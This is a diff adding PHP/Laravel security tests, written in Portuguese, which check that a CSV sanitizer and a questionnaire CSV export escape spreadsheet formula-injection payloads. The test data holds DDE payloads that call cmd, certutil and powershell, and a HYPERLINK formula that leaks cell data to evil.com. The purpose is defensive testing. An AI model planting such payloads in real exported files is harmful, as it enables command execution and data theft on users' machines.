@@ -12,9 +12,14 @@ use App\Models\AtendimentoSetor;
 use App\Models\Matricula;
 use App\Models\PeriodoLetivo;
 use App\Models\Pessoa;
+use App\Models\Questionario;
+use App\Models\QuestionarioBloco;
+use App\Models\QuestionarioPergunta;
 use App\Models\SacolaLeitura;
 use App\Models\Turma;
 use App\Models\User;
+use App\Services\QuestionarioService;
+use App\Support\CsvSanitizer;
 use App\Support\HtmlSanitizer;
 use Illuminate\Auth\Events\PasswordReset;
 use Illuminate\Foundation\Testing\RefreshDatabase;
@@ -540,5 +545,88 @@ class SecurityHardeningTest extends TestCase
         $this->assertNotNull($log);
         $this->assertStringContainsString('redefinida com sucesso', $log->description);
         $this->assertStringContainsString('revogadas', $log->description);
+    }
+
+    public function test_csv_sanitizer_neutraliza_formulas_maliciosas_e_comandos_dde(): void
+    {
+        // 1. Payloads maliciosos de injeção de fórmulas e comandos DDE
+        $payloadsMaliciosos = [
+            '=cmd|\'/C calc\'!A0',
+            '@SUM(1+1)*cmd|\'/C certutil\'!A0',
+            '-2+3+cmd|\'/C powershell\'!A0',
+            '+HYPERLINK("http://evil.com/leak?d="&A1; "Clique")',
+            "\t=1+1",
+            "\r=1+1",
+            '|cmd.exe',
+            '%COMSPEC%',
+            '   =1+1',
+        ];
+
+        foreach ($payloadsMaliciosos as $payload) {
+            $sanitizado = CsvSanitizer::sanitize($payload);
+            $this->assertStringStartsWith("'", (string) $sanitizado, "O payload '{$payload}' deveria ter sido neutralizado com apóstrofo.");
+        }
+
+        // 2. Dados numéricos e textos legítimos NÃO devem ser corrompidos
+        $dadosLegitimos = [
+            -10,
+            100,
+            '-15.50',
+            '+5511999999999',
+            'Maria da Silva Santos',
+            'teste.aluno@torre360.com.br',
+            'Rua das Flores, 123',
+            '01/01/2026',
+            null,
+            true,
+        ];
+
+        foreach ($dadosLegitimos as $dado) {
+            $resultado = CsvSanitizer::sanitize($dado);
+            if (is_numeric($dado)) {
+                $this->assertEquals($dado, $resultado, 'Valores puramente numéricos legítimos devem ser preservados.');
+            } elseif (is_string($dado)) {
+                $this->assertStringStartsNotWith("'", $resultado, "Texto comum legítimo '{$dado}' não deve receber apóstrofo.");
+            }
+        }
+
+        // 3. Desanitize reverte com precisão apóstrofos de segurança
+        $this->assertEquals('=cmd|calc', CsvSanitizer::desanitize("'=cmd|calc"));
+        $this->assertEquals('Texto Normal', CsvSanitizer::desanitize('Texto Normal'));
+    }
+
+    public function test_exportacao_csv_de_questionario_neutraliza_formulas_em_campos_de_usuario(): void
+    {
+        $questionario = Questionario::create([
+            'titulo' => 'Questionário de Avaliação',
+            'slug' => 'questionario-avaliacao-teste',
+            'ativo' => true,
+        ]);
+
+        $bloco = QuestionarioBloco::create([
+            'questionario_id' => $questionario->id,
+            'identificador' => 'bloco_1',
+            'titulo' => '=cmd|\'/C calc\'!A0', // Título malicioso
+            'ordem' => 1,
+        ]);
+
+        QuestionarioPergunta::create([
+            'questionario_bloco_id' => $bloco->id,
+            'identificador' => 'pergunta_1',
+            'enunciado' => '+HYPERLINK("http://evil.com")', // Enunciado com payload de exfiltração
+            'tipo' => 'texto',
+            'ordem' => 1,
+        ]);
+
+        $service = app(QuestionarioService::class);
+        $csvGerado = $service->exportToCsv($questionario);
+
+        // O CSV deve conter os apóstrofos de escape neutralizando as fórmulas
+        $this->assertStringContainsString("'=cmd|", $csvGerado);
+        $this->assertStringContainsString("'+HYPERLINK", $csvGerado);
+        $this->assertStringNotContainsString('";=cmd|', $csvGerado);
+        $this->assertStringNotContainsString('";+HYPERLINK', $csvGerado);
+        $this->assertStringNotContainsString('"=cmd|', $csvGerado);
+        $this->assertStringNotContainsString('"+HYPERLINK', $csvGerado);
     }
 }
